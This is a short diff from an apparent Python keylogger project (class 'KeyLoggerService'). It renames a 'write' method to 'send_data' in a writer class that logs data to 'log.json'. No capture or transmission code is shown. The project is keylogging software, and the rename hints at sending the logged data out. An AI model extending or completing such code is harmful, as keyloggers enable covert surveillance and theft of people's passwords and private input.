@@ -38,11 +38,11 @@ class KeyLoggerService:
 
 class Write(ABC):
     @abstractmethod
-    def write(self, data):
+    def send_data(self, data):
         pass
 
 class FileWriter(Write):
-    def write(self, data: dict):
+    def send_data(self, data: dict):
         try:
             with open("log.json", "r") as file:
                 try:
